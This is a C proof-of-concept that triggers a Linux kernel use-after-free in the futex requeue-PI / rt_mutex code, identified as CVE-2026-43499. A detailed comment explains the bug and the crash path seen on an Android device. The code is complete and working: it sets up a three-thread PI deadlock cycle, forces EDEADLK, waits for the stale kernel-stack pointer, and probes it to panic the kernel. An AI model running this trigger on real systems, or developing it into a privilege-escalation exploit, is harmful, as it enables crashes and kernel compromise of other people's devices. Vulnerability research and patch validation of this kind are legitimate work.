#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

#ifndef FUTEX_WAIT
#define FUTEX_WAIT              0
#define FUTEX_WAKE              1
#define FUTEX_LOCK_PI           6
#define FUTEX_UNLOCK_PI         7
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12
#define FUTEX_PRIVATE_FLAG      128
#endif

#define FLPI (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)

/*
 * CVE-2026-43499 — trigger PoC
 *
 * Bug (kernel/locking/rtmutex.c, remove_waiter()):
 *   rt_mutex_start_proxy_lock() calls task_blocks_on_rt_mutex() with
 *   task = W (the waiter being requeued), setting W->pi_blocked_on = waiter.
 *   On EDEADLK the chain walk returns without cleaning up. remove_waiter()
 *   dequeues the rt_waiter from the lock's rbtree but then zeroes
 *   current->pi_blocked_on (M's) instead of waiter->task->pi_blocked_on
 *   (W's). W->pi_blocked_on is left pointing at the rt_mutex_waiter local
 *   variable on W's kernel syscall stack.  When futex_wait_requeue_pi
 *   unwinds, that frame is gone — any subsequent PI chain walk that follows
 *   W->pi_blocked_on performs a UAF on freed kernel stack memory.
 *
 * Setup (3 threads, 3 PI-capable futexes — minimum to form the cycle):
 *   futex2      (PI, PRIVATE)  O owns (futex2 = O->tid)
 *   cycle_futex (PI, PRIVATE)  W owns (cycle_futex = W->tid); O blocks on it
 *   futex1      (plain, PRIVATE) W waits here via FUTEX_WAIT_REQUEUE_PI
 *
 * Deadlock cycle walked by FUTEX_CMP_REQUEUE_PI:
 *   W → futex2_pi_mutex [owner O]
 *     → O->pi_blocked_on → cycle_futex_pi_mutex [owner W]
 *       → W == orig_task  ⟹  -EDEADLK
 *
 * Wake path:
 *   FUTEX_WAKE refuses to wake PI waiters (rt_waiter != NULL, line 186 of
 *   waitwake.c). Signals cause handle_early_requeue_pi_wakeup() to return
 *   -ERESTARTNOINTR, which unconditionally restarts the syscall — W loops.
 *   Solution: FUTEX_WAIT_REQUEUE_PI with an absolute monotonic timeout. On
 *   expiry handle_early_requeue_pi_wakeup returns -ETIMEDOUT (no restart).
 *
 * UAF crash path (observed on Samsung S921 / Linux 6.1):
 *   After EDEADLK, W->pi_blocked_on = &W_rt_waiter (W's kernel stack slot).
 *   On timeout W's futex_wait_requeue_pi frame unwinds → W_rt_waiter freed.
 *   W->pi_blocked_on now dangles.
 *   M calls FUTEX_LOCK_PI(cycle_futex): rt_mutex_adjust_prio_chain() walks
 *   the PI chain and tries to write (priority update) into the stale waiter.
 *   The freed stack page is now read-only → permission fault at
 *   rt_mutex_adjust_prio_chain+0x3e0 → kernel panic:
 *   "Unable to handle kernel write to read-only memory"
 */

static uint32_t futex1      = 0;
static uint32_t futex2      = 0;
static uint32_t cycle_futex = 0;

static volatile int o_ready    = 0;
static volatile int w_ready    = 0;
static volatile int o_blocking = 0;
static volatile int w_waiting  = 0;
static volatile int uaf_probe  = 0;

static long xfutex(uint32_t *u, int op, uint32_t val,
                   void *ts, uint32_t *u2, uint32_t v3)
{
    return syscall(SYS_futex, u, op, val, ts, u2, v3);
}

static void dbg(const char *s) { write(2, s, strlen(s)); }

static void dbg_long(const char *prefix, long v, int en)
{
    char buf[128];
    int n = snprintf(buf, sizeof(buf), "%s%ld  errno=%d (%s)\n",
                     prefix, v, en, strerror(en));
    write(2, buf, n);
}

static void *owner_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);

    __atomic_store_n(&futex2, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&o_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&w_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    __atomic_store_n(&o_blocking, 1, __ATOMIC_RELEASE);
    /* blocks: kernel sets O->pi_blocked_on = &O_rt_waiter on cycle_futex_pi_mutex */
    xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

static void *waiter_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);
    struct timespec ts;
    long r;

    while (!__atomic_load_n(&o_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&w_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&o_blocking, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(20000); /* let O enter kernel and establish O->pi_blocked_on */

    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);

    /*
     * Absolute monotonic deadline 2 seconds from now.
     * FUTEX_CMP_REQUEUE_PI fires within ~60ms so EDEADLK happens well
     * before the deadline.  On timeout handle_early_requeue_pi_wakeup()
     * returns -ETIMEDOUT (not -ERESTARTNOINTR), so the syscall exits cleanly
     * and the futex_wait_requeue_pi stack frame — including W_rt_waiter —
     * is freed, leaving W->pi_blocked_on dangling.
     */
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 2;

    r = xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
    dbg_long("[W] FUTEX_WAIT_REQUEUE_PI returned ", r, errno);

    /* Thrash W's kernel stack so W_rt_waiter slot gets overwritten. */
    for (volatile int i = 0; i < 200; i++)
        syscall(SYS_getpid);

    /* Signal M: W's stack is freed and overwritten, UAF window is open. */
    __atomic_store_n(&uaf_probe, 1, __ATOMIC_RELEASE);

    /*
     * Stay alive as cycle_futex owner long enough for M to call
     * FUTEX_LOCK_PI(cycle_futex) and trigger the chain walk UAF while
     * W->pi_blocked_on is still stale.  500ms covers any scheduling jitter
     * from interactive shells, CPU affinity, or competing tasks.
     */
    usleep(500000);

    /* Unlock cycle_futex: wakes O, then O unlocks so M can acquire. */
    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

int main(void)
{
    pthread_t oth, wth;

    dbg("CVE-2026-43499 trigger\n");

    pthread_create(&oth, NULL, owner_fn, NULL);
    pthread_create(&wth, NULL, waiter_fn, NULL);

    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(40000); /* let W land in kernel FUTEX_WAIT_REQUEUE_PI queue */

    dbg("[M] deadlock chain: W->futex2(O)->cycle_futex(W)->W\n");
    dbg("[M] firing FUTEX_CMP_REQUEUE_PI\n");

    long ret = xfutex(&futex1, FCRQ,
                      1,                    /* nr_wake (must be 1 for requeue_pi) */
                      (void *)(uintptr_t)1, /* nr_requeue = 1                     */
                      &futex2,              /* PI target                          */
                      0);                   /* cmpval for futex1                  */
    int err = errno;
    dbg_long("[M] FUTEX_CMP_REQUEUE_PI = ", ret, err);

    if (ret == -1 && err == EDEADLK) {
        dbg("[M] EDEADLK: W->pi_blocked_on is stale — waiting for W timeout\n");

        while (!__atomic_load_n(&uaf_probe, __ATOMIC_ACQUIRE))
            sched_yield();

        /*
         * UAF probe: FUTEX_LOCK_PI(cycle_futex) forces a PI chain walk.
         * rt_mutex_adjust_prio_chain(owner=W) reads W->pi_blocked_on->lock
         * — stale pointer into W's freed kernel stack → UAF.
         */
        dbg("[M] UAF probe: FUTEX_LOCK_PI(cycle_futex)\n");
        xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
        dbg("[M] UAF probe returned\n");
        xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    }

    pthread_join(wth, NULL);
    pthread_join(oth, NULL);
    return 0;
}
